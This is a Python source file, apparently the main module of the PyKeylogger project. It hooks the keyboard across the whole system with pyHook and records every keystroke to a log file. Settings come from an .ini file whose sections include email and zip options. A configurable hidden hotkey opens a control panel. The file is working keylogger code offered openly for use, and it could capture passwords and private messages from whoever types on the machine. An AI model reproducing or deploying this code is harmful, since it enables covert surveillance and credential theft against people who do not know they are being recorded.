import pyHook
import time
import pythoncom
import sys
import imp
from optparse import OptionParser
import traceback
from logwriter import LogWriter
import version
import ConfigParser
from controlpanel import PyKeyloggerControlPanel
import Tkinter, tkMessageBox

class KeyLogger:
    ''' Captures all keystrokes, calls LogWriter class to log them to disk
    '''
    def __init__(self): 
        
        self.ParseOptions()
        self.ParseConfigFile()
        self.hm = pyHook.HookManager()
        self.hm.KeyDown = self.OnKeyboardEvent
    
        if self.settings['hookkeyboard'] == 'True':
            self.hm.HookKeyboard()
        #if self.options.hookMouse == True:
        #    self.hm.HookMouse()
        
        self.lw = LogWriter(self.settings) 

    def start(self):
        pythoncom.PumpMessages()


    def OnKeyboardEvent(self, event):
        '''This function is the stuff that's supposed to happen when a key is pressed.
        Calls LogWriter.WriteToLogFile with the keystroke properties.
        '''
        self.lw.WriteToLogFile(event)
        
        if event.Key == self.settings['controlkey']:
            PyKeyloggerControlPanel(self.settings, self)
            #self.stop()
            
        return True
    
    def stop(self):
        '''Exit cleanly.
        '''
        self.lw.stop()
        sys.exit()
    
    def ParseOptions(self):
        '''Read command line options
        '''
        parser = OptionParser(version=version.description + " version " + version.version + " (" + version.url + ").")
        parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
        parser.add_option("-c", "--configfile", action="store", dest="configfile", help="filename of the configuration ini file. [default: %default]")
        
        parser.set_defaults(debug=False, configfile="pykeylogger.ini")
        
        (self.options, args) = parser.parse_args()
    
    def ParseConfigFile(self):
        '''Read config file options from .ini file.
        Filename as specified by "--configfile" option, default "pykeylogger.ini".
        '''
        self.config = ConfigParser.SafeConfigParser()
        self.config.readfp(open(self.options.configfile))
        
        self.settings = dict(self.config.items('general'))
        self.settings.update(dict(self.config.items('email')))
        self.settings.update(dict(self.config.items('logmaintenance')))
        self.settings.update(dict(self.config.items('timestamp')))
        self.settings.update(dict(self.config.items('zip')))
        self.settings.update(self.options.__dict__) # add commandline options to our settings dict
                    
if __name__ == '__main__':
    def main_is_frozen():
        return (hasattr(sys, "frozen") or # new py2exe
                hasattr(sys, "importers") or # old py2exe
                imp.is_frozen("__main__")) # tools/freeze
    
    if not main_is_frozen(): #comment out this if statement to remove support request
        root=Tkinter.Tk()
        tkMessageBox.showinfo(title="Please support PyKeylogger", message="Please support PyKeylogger")
        root.destroy()
    kl = KeyLogger()
    kl.start()
    
    #if you want to change keylogger behavior from defaults, modify the .ini file. Also try '-h' for list of command line options.
    